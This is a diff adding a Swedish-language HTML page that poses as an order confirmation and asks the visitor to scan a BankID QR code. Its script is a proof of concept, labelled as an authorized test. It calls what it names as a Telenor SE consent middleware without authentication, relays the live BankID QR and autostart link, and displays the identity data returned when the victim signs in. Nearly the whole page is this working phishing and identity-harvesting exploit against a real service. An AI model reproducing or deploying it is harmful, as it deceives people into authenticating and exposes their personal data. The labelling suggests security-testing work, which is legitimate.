@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="sv">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Orderbekräftelse</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<style>
+  body{font-family:system-ui,sans-serif;text-align:center;background:#f5f5f5;color:#111;padding:24px;margin:0}
+  .card{background:#fff;max-width:420px;margin:0 auto;padding:24px;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+  h2{color:#222;font-size:1.2rem}
+  .sub{color:#666;font-size:.9rem}
+  #qr{display:flex;justify-content:center;margin:16px 0;background:#fff;padding:12px;border:1px solid #ddd;border-radius:8px}
+  #qr img{width:260px;height:260px}
+  #status{font-weight:600;color:#0066cc;min-height:1.4em}
+  #data{margin-top:12px;font-family:monospace;font-size:.85rem;color:#333;background:#f0f0f0;padding:10px;border-radius:6px;word-break:break-all;display:none}
+  a{color:#0066cc}
+</style>
+</head>
+<body>
+<div class="card">
+  <h2>Bekräfta din beställning</h2>
+  <p class="sub">Skanna QR-koden med BankID för att slutföra verifieringen</p>
+  <div id="qr"></div>
+  <p id="status">Startar…</p>
+  <p class="sub"><a id="link" href="#" style="display:none">Öppna BankID direkt på telefonen</a></p>
+  <div id="data"></div>
+</div>
+
+<script>
+// PoC: unauth BankID consent flow against Telenor SE MAUI middleware (authorized test)
+const BASE = "https://eone-middleware-customer-search-backend.ingress1-exp-prd-1.aws1.telenor.se/api/customer-consent/v2";
+const HDRS = {"Token":"dummy", "X-Client":"eOneGUI", "POS":"1"};
+let orderRef = null;
+
+async function start() {
+  setStatus("Startar…");
+  document.getElementById("data").style.display = "none";
+  try {
+    const r = await fetch(BASE + "/start-bankid/qr", {method:"POST", headers:HDRS});
+    orderRef = r.headers.get("eone-bankid");
+    if (!orderRef) { setStatus("Misslyckades (HTTP " + r.status + ")"); return; }
+    poll();
+  } catch (e) {
+    setStatus("Fel: " + e.message);
+  }
+}
+
+async function poll() {
+  try {
+    const r = await fetch(BASE + "/verify-bankid/qr", {headers: {...HDRS, "eone-bankid": orderRef}});
+    const qr = r.headers.get("eone-bankid-qr");
+    const isJson = (r.headers.get("content-type") || "").includes("json");
+
+    if (qr) {
+      // Live order — render the progressive QR (same content the Python PoC used)
+      document.getElementById("qr").innerHTML = "";
+      new QRCode(document.getElementById("qr"), qr);
+      const link = document.getElementById("link");
+      link.href = "bankid:///?autostarttoken=" + qr;
+      link.style.display = "inline";
+      setStatus("Väntar på skanning…");
+    } else if (r.status === 200 && isJson) {
+      const data = await r.json();           // <-- victim identity lands here
+      setStatus("Verifierad ✔");
+      const d = document.getElementById("data");
+      d.textContent = JSON.stringify(data);
+      d.style.display = "block";
+      return;                                // stop polling — order is done
+    } else {
+      setStatus("Orden avslutad (HTTP " + r.status + ") — startar om…");
+      setTimeout(start, 1500);
+      return;
+    }
+  } catch (e) {
+    setStatus("Fel: " + e.message);
+    setTimeout(poll, 3000);
+    return;
+  }
+  setTimeout(poll, 2000);
+}
+
+function setStatus(s) { document.getElementById("status").textContent = s; }
+
+start();
+</script>
+</body>
+</html>
